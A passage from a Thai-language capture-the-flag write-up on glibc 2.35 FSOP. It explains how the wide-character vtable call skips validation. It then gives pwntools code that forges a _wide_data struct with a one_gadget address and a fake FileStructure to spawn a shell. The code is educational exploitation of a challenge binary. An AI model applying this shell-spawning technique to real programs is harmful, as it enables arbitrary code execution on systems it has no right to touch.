fp->_wide_data->_shortbuf + 1, 0);
}
```

`_IO_WDOALLOCATE` เป็น Macro (อีกแล้ว) ไปจะทำงาน `__doallocate` vtables ครับ

ปกติแล้วการ call vtables จะใช้ `[JUMP1](https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/JUMP1)` และ `[_IO_JUMP_FUNC](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L124)` ซึ่งมันจะไปจบที่

```
# define _IO_JUMPS_FUNC(THIS) \
(IO_validate_vtable \
(*(struct _IO_jump_t ) ((void *) &_IO_JUMPS_FILE_plus (THIS) \
+ (THIS)->_vtable_offset)))
```

แต่ `[_IO_WDOALLOCATE](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L223)` ไปคนละทางครับ

```
// /libio/libioP.h

#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP) // #L223

#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS) // #L130

#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) // #L121

#define _IO_WIDE_JUMPS(THIS) \ // #L101
_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable

#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \ // #L94
(*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
+ offsetof(TYPE, MEMBER)))
```

เป็นการเรียกใช้ตรงๆเลยครับ ไม่มีเช็ค vtables

>

*🥰 *รักเลยแบบนี้ *(/≧▽≦)/*

*dissass _IO_wdoallocbuf*

`[_IO_WDOALLOCATE](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L223)` เทียบได้กับโค้ดตัวนี้ครับ หมายความว่าเราสร้าง fake struct `_wide_data` โดยใส่ข้อมูลอะไรก็ได้ไป 0x68 ตัว และ หลังจากนั้นก็ใส่ Address ของ Function ที่เราต้องการ

เราสามารถ construct Data ได้ประมาณนี้ครับ

```
_wide_data = b'\0'*0x68
_wide_data += p64(0xdeadbeefdeadbeef)
_wide_data += b"\x00" * (0xe0 - len(_wide_data))
_wide_data += p64(hbase+0xaa0)
```

เพราะว่า `p64(hbase+0xaa0)` ที่ชี้กลับมาที่ตัวเอง ทำหน้าที่เป็น` _wide_vtable` ที่จะไปอยู่ใน `rax` และ 0x68 ในตอนแรกเพื่อ Fake vtable

ซึ่งไหนๆก็ไหนๆแล้ว ผมจะสอนทุกคนใช้ [one_gadget](https://github.com/david942j/one_gadget) ไปด้วยทีเดียวเลย

>

อารมณ์มันจะประมาณว่า ถ้าเราสามารถรันโค้ดได้แค่ครั้งเดียว เราจะรันอะไร?
ถ้าเป็นในสถานการณ์ปกติก็คงจะเป็น Pivot Gadget
แต่ตอนนี้เรามีแทบจะทุกอย่างแล้ว เพราะฉะนั้นใช้ one_gadget

“For the love of God 🙏”

[one_gadget](https://github.com/david942j/one_gadget)คือ Tools ที่ใช้หาช่วงโค้ดใน Libc ที่สามารถรันแบบปุ๊ปปั๊ป รับ shell ได้ทันที

`r10` เป็น 0 และ `rdx` ชี้ไปที่ 0
ซึ่งเราก็สามารถใช้ `0xebc85` ได้เลย

```
_wide_data = b'\0'*0x68
_wide_data += p64(libcaddr+0xebc85) # one_gadget
_wide_data += b"\x00" * (0xe0 - len(_wide_data))
_wide_data += p64(hbase+0xaa0)

edit(8, _wide_data) # 0xaa0

arr = FileStructure(0)
arr._IO_write_ptr = 1
arr._IO_write_base = 0
arr.vtable = p64(libc.sym['_IO_wfile_jumps'])
arr._wide_data = p64(hbase+0xaa0)

```

เรามาทดลองรันจริงกันเลยไหมครับ?

*shell!*

ก็ประมาณนี้ครับสำหรับ Statical Analysis ของ Technique ต่างๆ และ FSOP !

Solver : [https://github.com/XCNXD/CTF-Writeup/blob/main/SEC%20Playground%20Cybersplash%202026%C2%A0CTF/exp.py](https://github.com/XCNXD/CTF-Writeup/blob/main/SEC%20Playground%20Cybersplash%202026%C2%A0CTF/exp.py)

===============================================================

ผมไม่คิดไม่ฝันเลยครับว่าจะได้กลับมาเรียน FSOP เร็วขนาดนี้ จำได้ว่าพึ่งบ่นไปตอนบทความ Lazy Binding เรื่อง ret2dlresolve ว่าไม่อยากเรียนเพราะเสียเวลา 55555

แต่อย่างไรก็ตาม “ผมทำสำเร็จอีกครั้ง”แล้วครับ!!! 🥳🎉

>

ถ้าชอบบทความที่ความรู้แน่นๆแบบนี้ สามารถสนับสนุน[คอร์สเรียน Binary Exploitation](https://www.facebook.com/share/p/1GnqDT5yCk/) ของผมได้นะครับ ยินดีอย่างยิ่งเลย😂

และนี่ก็คือทั้งหมดของบทความในวันนี้ครับ
ขอขอบคุณ SEC Playground สำหรับโจทย์ในครั้งนี้ และหวังว่าบทความในครั้งนี้จะเป็นประโยชน์สำหรับทุกท่านที่ตั้งใจอ่านจนจบนะครับ
ヾ(≧▽≦*)o

以上です![#SECPlaygroundCybersplash2026](https://www.facebook.com/hashtag/secplaygroundcybersplash2026?__cft__%5B0%5D=AZZrZsh8DK9fhncRC6w0P1opKpMlMNBAG5bTCttQkiDN-5AJDMz05qGbrtFnrSFVAJPzU9jGGxUSGHHKj_4DI25ZJvsyUrhqY_zO0v9gTA2SKZo_WiUDd8hTLKAsBcRZNunhZ0hM8eZT_nsJxVv74vVCkej_JaDxjdA4RSVnOs78EKQQ7O90DWTzVi4InqV0CYmQRJV3yn10P3QZb_-faVv1&__tn__=*NK-R)

---
